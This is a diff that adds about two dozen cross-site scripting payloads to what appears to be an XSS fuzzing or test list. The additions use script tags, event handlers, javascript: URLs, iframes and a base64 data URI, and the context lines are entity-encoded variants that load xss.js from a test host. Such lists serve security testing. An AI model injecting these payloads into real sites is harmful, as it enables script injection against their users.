@@ -122,3 +122,27 @@ perl -e &#39;print &#34;&#38;&#60;SCR&#92;0IPT&#62;alert&#40;&#34;XSS&#34;&#41;&
 &#60;SCRIPT a&#61;&#96;&#62;&#96; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
 &#60;SCRIPT&#62;document.write&#40;&#34;&#60;SCRI&#34;&#41;&#59;&#60;&#47;SCRIPT&#62;PT SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
 &#60;SCRIPT a&#61;&#34;&#62;&#39;&#62;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror="this.onerror=null;alert(1)">
+<img src=1 onerror=confirm(document.domain)>
+<svg onload=alert(1)>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>X</marquee>
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+<a href=//# onclick=alert(1)>click</a>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe onload=alert(1) src="about:blank"></iframe>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<embed src=x onerror=alert(1)>
+<math href="javascript:alert(1)">X</math>
+<input autofocus onfocus=alert(1)>
+<button onclick=alert(1)>click</button>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<base href="javascript:alert(1);//">
+<body onload=alert(1)>
+
